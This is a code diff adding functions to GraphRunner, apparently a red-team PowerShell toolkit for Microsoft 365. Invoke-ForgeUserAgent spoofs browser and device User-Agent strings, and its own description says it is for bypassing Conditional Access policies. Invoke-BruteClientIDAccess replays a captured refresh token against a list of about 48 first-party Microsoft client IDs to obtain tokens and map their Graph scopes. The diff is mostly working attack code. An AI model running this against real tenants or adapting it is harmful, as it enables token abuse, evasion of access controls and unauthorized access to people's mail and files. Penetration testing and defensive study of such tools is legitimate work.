@@ -5129,8 +5129,262 @@ function Invoke-GraphRunner{
 
     Write-Host -ForegroundColor yellow "[*] Results have been written to $folderName"
 }
+function Get-TenantID
+{
+    [cmdletbinding()]
+    Param(
+        [Parameter(ParameterSetName='Domain',Mandatory=$True)]
+        [String]$domain
+    )
+    Process
+    {
+        $openIdConfig=Invoke-RestMethod "https://login.microsoftonline.com/$domain/.well-known/openid-configuration"
+        $TenantId = $OpenIdConfig.authorization_endpoint.Split("/")[3]
+        return $TenantId
+    }
+}
+function Invoke-ForgeUserAgent
+{
+      <#
+    .DESCRIPTION
+        Forge the User-Agent when sending requests to the Microsoft API's. Useful for bypassing device specific Conditional Access Policies. Defaults to Windows Edge.
+    #>
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+        [String]$Device,
+        [Parameter(Mandatory=$False)]
+        [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+        [String]$Browser
+    )
+    Process
+    {
+        if ($Device -eq 'Mac')
+        {
+            if ($Browser -eq 'Chrome')
+            {
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
+            }
+            elseif ($Browser -eq 'Firefox')
+            {
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0'
+            }
+            elseif ($Browser -eq 'Edge')
+            {
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/604.1 Edg/91.0.100.0'
+            }
+            elseif ($Browser -eq 'Safari')
+            {
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
+            }
+            else 
+            {
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
+            }
+        }
+        elseif ($Device -eq 'Windows')
+        {
+            if ($Browser -eq 'IE')
+            {
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
+            }
+            elseif ($Browser -eq 'Chrome')
+            {
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
+            }
+            elseif ($Browser -eq 'Firefox')
+            {
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0'
+            }
+            elseif ($Browser -eq 'Edge')
+            {
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
+            }
+            else 
+            {
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
+            }
+        }
+        elseif ($Device -eq 'AndroidMobile')
+        {
+            if ($Browser -eq 'Android')
+            {
+                $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
+            }
+            elseif ($Browser -eq 'Chrome')
+            {
+                $UserAgent = 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36'
+            }
+            elseif ($Browser -eq 'Firefox')
+            {
+                $UserAgent = 'Mozilla/5.0 (Android 4.4; Mobile; rv:70.0) Gecko/70.0 Firefox/70.0'
+            }
+            elseif ($Browser -eq 'Edge')
+            {
+                $UserAgent = 'Mozilla/5.0 (Linux; Android 8.1.0; Pixel Build/OPM4.171019.021.D1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 EdgA/42.0.0.2057'
+            }
+            else 
+            {
+                $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
+            }
+        }
+        elseif ($Device -eq 'iPhone')
+        {
+            if ($Browser -eq 'Chrome')
+            {
+                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.114 Mobile/15E148 Safari/604.1'
+            }
+            elseif ($Browser -eq 'Firefox')
+            {
+                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4'
+            }
+            elseif ($Browser -eq 'Edge')
+            {
+                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 EdgiOS/44.5.0.10 Mobile/15E148 Safari/604.1'
+            }
+            elseif ($Browser -eq 'Safari')
+            {
+                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
+            }
+            else 
+            {
+                $UserAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
+            }
+        }
+        else 
+        {
+            #[ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+            if ($Browser -eq 'Android')
+            {
+                $UserAgent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
+            }
+            elseif($Browser -eq 'IE')
+            { 
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
+            }
+            elseif($Browser -eq 'Chrome')
+            { 
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
+            }
+            elseif($Browser -eq 'Firefox')
+            { 
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0'
+            }
+            elseif($Browser -eq 'Safari')
+            {
+                $UserAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15' 
+            }
+            else
+            {
+                $UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
+            } 
+        }
+        return $UserAgent
+   }   
+}
+function Invoke-BruteClientIDAccess {
 
-
+    [cmdletbinding()]
+    Param([Parameter(Mandatory=$true)]
+    [string]$domain,
+    [Parameter(Mandatory=$false)]
+    [string]$Resource = "https://graph.microsoft.com/",
+    [Parameter(Mandatory=$true)]
+    [string]$refreshToken,
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+    [String]$Device,
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+    [String]$Browser,
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Yellow','Red','DarkGreen','DarkRed')]
+    [String]$OutputColor = "White"
+    )
+    if ($Device) {
+		if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+		}
+		else {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device
+		}
+	}
+	else {
+	   if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
+	   } 
+	   else {
+			$UserAgent = Invoke-ForgeUserAgent
+	   }
+	}
+    $AppInfo = @(
+        [pscustomobject]@{ClientID='00b41c95-dab0-4487-9791-b9d2c32c80f2'; App='Office 365 Management'}
+        [pscustomobject]@{ClientID='04b07795-8ddb-461a-bbee-02f9e1bf7b46'; App='Microsoft Azure CLI'}
+        [pscustomobject]@{ClientID='0ec893e0-5785-4de6-99da-4ed124e5296c'; App='Office UWP PWA'}
+        [pscustomobject]@{ClientID='18fbca16-2224-45f6-85b0-f7bf2b39b3f3'; App='Microsoft Docs'}
+        [pscustomobject]@{ClientID='1950a258-227b-4e31-a9cf-717495945fc2'; App='Microsoft Azure PowerShell'}
+        [pscustomobject]@{ClientID='1b3c667f-cde3-4090-b60b-3d2abd0117f0'; App='Windows Spotlight'}
+        [pscustomobject]@{ClientID='1b730954-1685-4b74-9bfd-dac224a7b894'; App='Azure Active Directory PowerShell'}
+        [pscustomobject]@{ClientID='1fec8e78-bce4-4aaf-ab1b-5451cc387264'; App='Microsoft Teams'}
+        [pscustomobject]@{ClientID='22098786-6e16-43cc-a27d-191a01a1e3b5'; App='Microsoft To-Do client'}
+        [pscustomobject]@{ClientID='268761a2-03f3-40df-8a8b-c3db24145b6b'; App='Universal Store Native Client'}
+        [pscustomobject]@{ClientID='26a7ee05-5602-4d76-a7ba-eae8b7b67941'; App='Windows Search'}
+        [pscustomobject]@{ClientID='27922004-5251-4030-b22d-91ecd9a37ea4'; App='Outlook Mobile'}
+        [pscustomobject]@{ClientID='29d9ed98-a469-4536-ade2-f981bc1d605e'; App='Microsoft Authentication Broker'}
+        [pscustomobject]@{ClientID='2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8'; App='Microsoft Bing Search for Microsoft Edge'}
+        [pscustomobject]@{ClientID='4813382a-8fa7-425e-ab75-3b753aab3abb'; App='Microsoft Authenticator App '}
+        [pscustomobject]@{ClientID='4e291c71-d680-4d0e-9640-0a3358e31177'; App='PowerApps'}
+        [pscustomobject]@{ClientID='57336123-6e14-4acc-8dcf-287b6088aa28'; App='Microsoft Whiteboard Client'}
+        [pscustomobject]@{ClientID='57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0'; App='Microsoft Flow Mobile PROD-GCCH-CN'}
+        [pscustomobject]@{ClientID='60c8bde5-3167-4f92-8fdb-059f6176dc0f'; App='Enterprise Roaming and Backup'}
+        [pscustomobject]@{ClientID='66375f6b-983f-4c2c-9701-d680650f588f'; App='Microsoft Planner'}
+        [pscustomobject]@{ClientID='844cca35-0656-46ce-b636-13f48b0eecbd'; App='Microsoft Stream Mobile Native'}
+        [pscustomobject]@{ClientID='872cd9fa-d31f-45e0-9eab-6e460a02d1f1'; App='Visual Studio - Legacy'}
+        [pscustomobject]@{ClientID='87749df4-7ccf-48f8-aa87-704bad0e0e16'; App='Microsoft Teams - Device Admin Agent'}
+        [pscustomobject]@{ClientID='90f610bf-206d-4950-b61d-37fa6fd1b224'; App='Aadrm Admin PowerShell'}
+        [pscustomobject]@{ClientID='9ba1a5c7-f17a-4de9-a1f1-6178c8d51223'; App='Microsfot Intune Company Portal'}
+        [pscustomobject]@{ClientID='9bc3ab49-b65d-410a-85ad-de819febfddc'; App='Microsoft SharePoint Online Management Shell'}
+        [pscustomobject]@{ClientID='a0c73c16-a7e3-4564-9a95-2bdf47383716'; App='Microsoft Exchange Online Remote PowerShell'}
+        [pscustomobject]@{ClientID='a40d7d7d-59aa-447e-a655-679a4107e548'; App='Accounts Control UI'}
+        [pscustomobject]@{ClientID='a569458c-7f2b-45cb-bab9-b7dee514d112'; App='Yammer iPhone'}
+        [pscustomobject]@{ClientID='ab9b8c07-8f02-4f72-87fa-80105867a763'; App='OneDrive Sync Engine '}
+        [pscustomobject]@{ClientID='af124e86-4e96-495a-b70a-90f90ab96707'; App='OneDrive iOS App'}
+        [pscustomobject]@{ClientID='b26aadf8-566f-4478-926f-589f601d9c74'; App='OneDrive'}
+        [pscustomobject]@{ClientID='b90d5b8f-5503-4153-b545-b31cecfaece2'; App='AADJ CSP '}
+        [pscustomobject]@{ClientID='c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12'; App='Microsoft Power BI'}
+        [pscustomobject]@{ClientID='c58637bb-e2e1-4312-8a00-04b5ffcd3403'; App='SharePoint Online Client Extensibility'}
+        [pscustomobject]@{ClientID='cb1056e2-e479-49de-ae31-7812af012ed8'; App='Microsoft Azure Active Directory Connect'}
+        [pscustomobject]@{ClientID='cf36b471-5b44-428c-9ce7-313bf84528de'; App='Microsoft Bing Search'}
+        [pscustomobject]@{ClientID='d326c1ce-6cc6-4de2-bebc-4591e5e13ef0'; App='SharePoint'}
+        [pscustomobject]@{ClientID='d3590ed6-52b3-4102-aeff-aad2292ab01c'; App='Microsoft Office'}
+        [pscustomobject]@{ClientID='e9b154d0-7658-433b-bb25-6b8e0a8a7c59'; App='Outlook Lite'}
+        [pscustomobject]@{ClientID='e9c51622-460d-4d3d-952d-966a5b1da34c'; App='Microsoft Edge'}
+        [pscustomobject]@{ClientID='eb539595-3fe1-474e-9c1d-feb3625d1be5'; App='Microsoft Tunnel'}
+        [pscustomobject]@{ClientID='ecd6b820-32c2-49b6-98a6-444530e5a77a'; App='Microsoft Edge'}
+        [pscustomobject]@{ClientID='f05ff7c9-f75a-4acd-a3b5-f4b6a870245d'; App='SharePoint Android'}
+        [pscustomobject]@{ClientID='f448d7e5-e313-4f90-a3eb-5dbb3277e4b3'; App='Media Recording for Dynamics 365 Sales'}
+        [pscustomobject]@{ClientID='f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34'; App='Microsoft Edge'}
+        [pscustomobject]@{ClientID='fb78d390-0c51-40cd-8e17-fdbfab77341b'; App='Microsoft Exchange REST API Based PowerShell'}
+        [pscustomobject]@{ClientID='fc0f3af4-6835-4174-b806-f7db311fd2f3'; App='Microsoft Intune Windows Agent'}
+        )
+        $AppInfo | % {
+        $Headers=@{}
+        $Headers["User-Agent"] = $UserAgent
+        $TenantId = Get-TenantID -domain $domain
+        $authUrl = "https://login.microsoftonline.com/$($TenantId)"
+        $body = @{
+            "resource" =      $Resource
+            "client_id" =     $_.ClientID
+            "grant_type" =    "refresh_token"
+            "refresh_token" = $refreshToken
+            "scope" = "openid"
+        }
+        $ErrorActionPreference = "SilentlyContinue"
+        $global:CustomToken = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $body
+        Write-Host -ForegroundColor $OutputColor "App: $($_.App) ClientID: $($_.ClientID) has scope of: $($CustomToken.scope)"
+    }
+}
 
 function List-GraphRunnerModules{
     <#
@@ -5190,6 +5444,7 @@ Invoke-DriveFileDownload`t-`t Has the ability to download single files from as t
 Invoke-CheckAcces`t`t-`t Check if tokens are valid
 Invoke-AutoOAuthFlow`t`t-`t Automates OAuth flow by standing up a web server and listening for auth code
 Invoke-HTTPServer`t`t-`t A basic web server to use for accessing the emailviewer that is output from Invoke-SearchMailbox
+Invoke-BruteClientIDAccess`t`t-`t Test different CLientID's against MSGraph to determine permissions
     "
     Write-Host -ForegroundColor green ("=" * 80)
     Write-Host -ForegroundColor green '[*] For help with individual modules run Get-Help <module name> -detailed'
